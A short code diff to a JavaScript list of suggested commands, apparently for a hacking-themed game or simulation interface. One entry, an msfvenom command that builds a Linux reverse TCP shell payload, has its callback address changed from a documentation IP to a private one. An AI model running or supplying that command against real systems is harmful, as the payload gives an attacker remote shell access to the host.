@@ -33,7 +33,7 @@ const suggestedCommands = [
   "route use relay",
   "route use direct",
   "build package safe",
-  `msfvenom -p linux/x86/shell_reverse_tcp LHOST=203.0.113.25 LPORT=443 -b "\\x00\\x0a\\x0d" -f python`,
+  `msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.20.44.9 LPORT=443 -b "\\x00\\x0a\\x0d" -f python`,
   "send package",
   "beacon start",
   "beacon stop",
